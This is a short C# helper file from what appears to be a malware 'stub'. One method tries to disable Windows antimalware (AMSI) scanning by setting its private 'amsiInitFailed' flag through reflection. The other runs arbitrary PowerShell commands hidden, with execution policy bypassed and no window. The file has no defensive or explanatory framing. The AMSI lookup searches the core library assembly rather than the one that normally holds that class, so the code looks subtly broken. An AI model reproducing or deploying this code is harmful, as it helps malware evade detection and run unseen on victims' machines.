using System;
using System.Diagnostics;
using System.Reflection;

namespace Stub.Helpers
{
    public static class ExecutionHelpers
    {
        public static void BypassAMSI()
        {
            var asm = typeof(object).Assembly;
            var type = asm.GetType("System.Management.Automation.AmsiUtils");
            var field = type?.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
            field?.SetValue(null, true);
        }

        public static void RunPowerShell(string command)
        {
            Process.Start(new ProcessStartInfo("powershell.exe", $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"{command}\"")
            {
                UseShellExecute = false,
                CreateNoWindow = true
            });
        }
    }
}
